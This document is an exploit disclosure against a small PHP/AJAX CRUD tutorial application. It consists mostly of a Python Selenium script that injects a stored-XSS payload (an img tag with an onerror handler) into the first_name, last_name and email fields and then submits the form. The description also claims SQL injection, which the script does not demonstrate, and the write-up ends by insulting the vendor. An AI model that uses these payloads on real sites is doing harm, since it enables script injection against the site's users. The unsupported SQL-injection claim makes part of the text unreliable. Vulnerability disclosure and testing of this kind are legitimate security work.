### Exploit Title: PHP CRUD (by: oretnom23 ) is vulnerable to XSS Stored Attack and remote SQL-Injection special characters.
### Author: nu11secur1ty
### Testing and Debugging: nu11secur1ty 
### Date: 09.10.2021
### Vendor: https://www.sourcecodester.com/user/257130/activity
### Link: https://www.sourcecodester.com/tutorial/14937/php-crud-without-refreshreload-using-ajax-and-datatables-tutorial
### CVE: CVE-nu11-10

[+] Exploit Source: 

#!/usr/bin/python3
# Author: @nu11secur1ty
# Debug and Developement: @nu11secur1ty 
# CVE-nu11-10

from selenium import webdriver
import time
import os
from colorama import init, Fore, Back, Style
from selenium.webdriver.chrome.options import Options
init(convert=True)

PHPCRUD="http://192.168.1.180/ajax_crud/"
browser = webdriver.Chrome()
browser.get((PHPCRUD))	
try:
	### 0
	browser.maximize_window()
	time.sleep(1)
	browser.execute_script("document.querySelector('[class=\"dt-button btn btn-primary py-0\"]').click()")
	
	time.sleep(3)
	browser.execute_script("document.querySelector('[name=\"first_name\"]').value = '</span><img src=1 onerror=alert(1) /><span>'")
	time.sleep(3)
	browser.execute_script("document.querySelector('[name=\"last_name\"]').value = '</span><img src=1 onerror=alert(1) /><span>'")
	time.sleep(3)
	browser.execute_script("document.querySelector('[name=\"email\"]').value = '</span><img src=1 onerror=alert(1) /><span>'")
	
	print(Fore.GREEN + 'Choice the calendar date and Press Enter to continue...\n')
	print(Style.RESET_ALL)
	input()
	time.sleep(5)
	# submit
	browser.execute_script("document.querySelector('[class=\"btn btn-primary\"]').click()")
	
	
	print(Fore.RED + 'The payload for CVE-nu11-10 is deployed and you are CRITICAL HACKED BY XSS STORED return error 1 ATTACK, your MySQL is PWNED\n')
	print(Style.RESET_ALL)
	
except Exception:
	#### This exception occurs if the element are not found in the webpage.
	print("Some error occured :(")

------------------------------------------------------------------

Description:
The PHP CRUD (by: oretnom23 ) is vulnerable to XSS Stored Attack and remote SQL-Injection special characters. 
In the application: ajax_crud the parameters, first_name, last_name, and email are vulnerable to XSS Stored attack! 
When the user will sending a malicious javascript payload, he can store a special character - string, onto the MySQL server. 
The MySQL server can't read it because there have no prepared statements or the appropriate replacement/formatting rules in order to prevent SQL injection and the system will be down. 
Status: CRITICAL

-------------------------------------------------------------------
### CONCLUSION: This vendor must STOP creating all these broken projects and vulnerable software programs, probably he is not a developer!

### BR 
- [+] @nu11secur1ty System Administrator - Infrastructure and Penetration Testing Engineer

-------------------------------------------------------------------
### Reproduce: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/CVE-nu11-10-09102021
### Proof: https://streamable.com/8n85yf
### BR nu11secur1ty
